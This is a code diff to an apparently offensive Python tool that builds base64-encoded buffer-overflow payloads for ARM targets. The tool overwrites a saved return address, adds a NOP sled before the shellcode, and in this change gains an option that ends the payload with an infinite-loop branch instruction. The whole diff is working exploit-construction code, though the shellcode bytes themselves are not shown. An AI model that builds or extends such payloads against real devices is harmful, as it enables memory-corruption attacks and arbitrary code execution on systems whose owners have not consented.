@@ -38,7 +38,7 @@ SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)
 
 
 def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b"", bare=False,
-          sledfill=False, units=1, pcround=0):
+          sledfill=False, units=1, pcround=0, hang=False):
     """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode.
 
     `bare` stops after the overwritten word, so the payload length is exactly the
@@ -61,7 +61,7 @@ def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b"", bare=Fals
         # `ldrlt rX, [pc, #0]` (imm 0) instead of a load from an unmapped offset
         val &= ~(pcround - 1)
     pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
-    body = SLED * (sled // 4) + sc
+    body = SLED * (sled // 4) + sc + (b"\xfe\xff\xff\xea" if hang else b"")
     return base64.b64encode(filler + pc + body * max(1, units)).decode()
 
 
@@ -152,6 +152,7 @@ def main():
     ap.add_argument("--units", type=int, default=1, help="repeat sled+shellcode N times")
     ap.add_argument("--pcround", type=lambda x: int(x, 0), default=0,
                     help="round the written pc down to this power of two")
+    ap.add_argument("--hang", action="store_true", help="end the payload with `b .`")
     ap.add_argument("--count", type=int, default=40)
     ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
     a = ap.parse_args()
@@ -192,7 +193,7 @@ def main():
         return
 
     b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare,
-                units=a.units)
+                units=a.units, hang=a.hang)
     if a.mode == "build":
         if a.out:
             open(a.out, "w").write(b64)
